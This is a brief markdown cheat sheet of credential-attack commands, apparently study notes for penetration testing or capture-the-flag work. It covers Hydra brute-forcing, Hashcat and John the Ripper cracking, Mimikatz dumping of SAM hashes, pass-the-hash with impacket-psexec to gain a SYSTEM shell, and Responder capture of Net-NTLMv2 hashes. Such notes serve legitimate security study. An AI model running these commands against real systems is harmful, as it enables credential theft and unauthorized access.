## Hydra
```
hydra -l [username] -P [wordlist] [service]://$ip

refer to hydra -help if needed
```

## Hashcat
To determine the hash type, use ```hashcat --help | grep -i "SERVICE NAME" ```
When attempting to crack,
```
hashcat -m [mode number for hash type] [hashfile] [wordlist] -r [any hashcat rule] --force
```

## JtR (John the Ripper)
Transforming different file formats into hashes:
```
keepass2john (for keepass)
ssh2john (for ssh)

if theres more check online
```
For cracking,
```
john --wordlist=[wordlist] --rules=[rulefile] [hashfile]
```

## Crackstation.net
https://crackstation.net/ (if hashcat,jtr fail then use this)
## NTLM Hashes
How to obtain:
```
1. Run Powershell as Administrator
2. Run Mimikatz
3. Run the following commands:
	privilege::debug
	token::elevate
	lsadump::sam
4. Profit (just kidding extract it and do whatever you want with it such as cracking etc)
```

For Pass-The-Hash Attacks (obtaining shell)
```
1. Follow Step 1-3 of How to Obtain
2. impacket-psexec -hashes 00000000000000000000000000000000:[NTLMHash] [user]@[ip] (THIS WILL GIVE SYSTEM)
3. use impacket-wmiexec if you want the user instead
```
For Net-NTLMv2
```
1. Use Responder, set up by running responder -I tun0
2. Try and make the target to connect to our smb share from responder to get the NTLM hash
3. Crack using hashcat to get the password to RDP in
```

